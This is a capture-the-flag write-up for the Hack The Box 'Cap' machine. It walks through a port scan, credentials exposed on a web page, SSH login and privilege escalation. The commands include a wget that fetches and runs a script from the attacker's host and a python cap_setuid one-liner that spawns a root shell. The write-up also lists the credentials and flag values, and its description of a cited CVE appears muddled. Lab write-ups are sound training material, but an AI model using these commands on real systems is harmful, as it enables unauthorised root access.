---
icon: graduation-cap
---

# HTB-CAP

<figure><img src="../../../../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>

### Reconnaissance

Performed a full TCP port scan using Nmap:

```bash
nmap -Pn -sV -sV -p- -vv 10.10.10.245

Discovered open port 22/tcp on 10.10.10.245
Discovered open port 80/tcp on 10.10.10.245
Discovered open port 21/tcp on 10.10.10.245
```

**Open Ports Discovered:**

* `21/tcp` – FTP
* `22/tcp` – SSH
* `80/tcp` – HTTP

### Web Enumeration

Navigating to `http://10.10.10.245/` revealed a file directory at `/data/0`.

<figure><img src="../../../../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>

Inside the page, credentials were exposed in plain text:

> User: nathan
>
> **Password**: `Buck3tH4TF0RM3!`

### SSH Access

Using the credentials above, we were able to SSH into the box:

```bash
ssh nathan@10.10.10.245
# Password: Buck3tH4TF0RM3!

```

Login successful as user `nathan`.

<figure><img src="../../../../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

While exploring the system as `nathan`, we discovered a potential local privilege escalation vulnerability:

**CVE-2022-37706** – Exploits `chmod` on Capabilities with special permission sets.

📎 [CVE-2022-37706 PoC GitHub](https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2022-37706)

### Exploit Transfer

To transfer the PoC script to the victim machine:

**Attacker (Kali)**

<figure><img src="../../../../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>

```bash
python3 -m http.server 80

```

**Victim (CAP Box)**

<figure><img src="../../../../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>

```bash
wget <http://10.10.14.63/privesc.sh>
chmod +x privesc.sh
./privesc.sh

```

<figure><img src="../../../../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>

### Capability Enumeration

We scanned the system for binaries with special Linux capabilities using:

```bash
getcap -r / 2>/dev/null

```

This command recursively lists all files with capabilities set, ignoring permission errors.

**Interesting Output:**

```bash
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

```

This indicates that `python3.8` has the `cap_setuid` capability, which can be abused for privilege escalation.

<figure><img src="../../../../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>

### Root Shell via Python (GTFOBins)

Using the GTFOBins technique for `python` with `cap_setuid`, we spawned a root shell:\
[https://gtfobins.github.io/gtfobins/python/#capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities)

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

```

Got root access successfully.

### Flags Captured

**User Flag:**

```bash
cat /home/nathan/user.txt
a23d2c286ea0259eded64b10b0ad8d69

```

**Root Flag:**

```bash
cat /root/root.txt
fd7286819ab053d7d05903f857ef5405

```

### Summary

| Phase                | Outcome                         |
| -------------------- | ------------------------------- |
| Initial Access       | Found creds on exposed web page |
| User Shell           | SSH login as `nathan`           |
| Privilege Escalation | Used Python with capabilities   |
| Root Shell           | Gained via GTFOBins             |
| Flags Captured       | User + Root                     |

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
